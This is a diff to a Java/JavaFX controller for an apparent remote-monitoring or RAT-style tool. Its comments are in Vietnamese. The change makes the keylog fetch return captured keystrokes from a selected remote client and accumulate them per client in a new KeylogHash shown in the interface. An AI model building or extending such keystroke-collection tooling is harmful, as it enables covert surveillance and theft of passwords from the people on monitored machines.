@@ -71,7 +71,8 @@ public class HelloController implements Initializable {
     @FXML
     private Label welcomeText;
     public static ObservableList<String> listClient;
-    public static HashMap<String,OsHWModel> OShash;
+    public static HashMap<String, OsHWModel> OShash;
+    public static HashMap<String, String> KeylogHash;
     public static ObservableList<ProcessModel> listProcess;
     public static ObservableList<DiskModel> listDisk;
     //Take Screen Shot
@@ -172,6 +173,7 @@ public class HelloController implements Initializable {
         listClient = FXCollections.observableList(Arrays.asList(""));
         table.setItems(listClient);
         OShash = new HashMap<>();
+        KeylogHash = new HashMap<>();
         onRefeshAction();
     }
 
@@ -227,11 +229,17 @@ public class HelloController implements Initializable {
             return;
         }
         tabPane.getSelectionModel().selectFirst();
+        String keylog = onGetKeyLog();
         if(OShash.containsKey(index)){
             OsHWModel os = OShash.get(index);
             OsName.setText(os.getOSPreFix());
             CPUText.setText(os.getProc());
             Display.setText(os.getDisplay());
+            KeylogHash.put(index,KeylogHash.get(index)+keylog);
+            keyLogerLabel.setText(KeylogHash.get(index));
+        }else{
+            KeylogHash.put(index,keylog);
+            keyLogerLabel.setText(KeylogHash.get(index));
         }
         try {
             Message object = new Message();
@@ -473,10 +481,10 @@ public class HelloController implements Initializable {
         DiskChart.getData().add(avail);
     }
 
-    public void onGetKeyLog() {
+    public String onGetKeyLog() {
         String index = table.getSelectionModel().getSelectedItem();
         if(index == null||!index.contains("client")){
-            return;
+            return "";
         }
         Message object = new Message();
         object.command = Message.GET_KEYLOG;
@@ -486,12 +494,14 @@ public class HelloController implements Initializable {
             Client.dos.writeObject(object);
             Message msg = (Message) Client.dis.readObject();
             if(msg.data.equals("error")){
-                keyLogerLabel.setText("Người dùng đã ngắt kết nối");
-                return;
+//                keyLogerLabel.setText("Người dùng đã ngắt kết nối");
+                return "";
             }
             keyLogerLabel.setText(msg.data);
+            return msg.data;
         } catch (IOException | ClassNotFoundException e) {
             System.err.println("Lỗi ghê á ghi phím");
         }
+        return "";
     }
 }
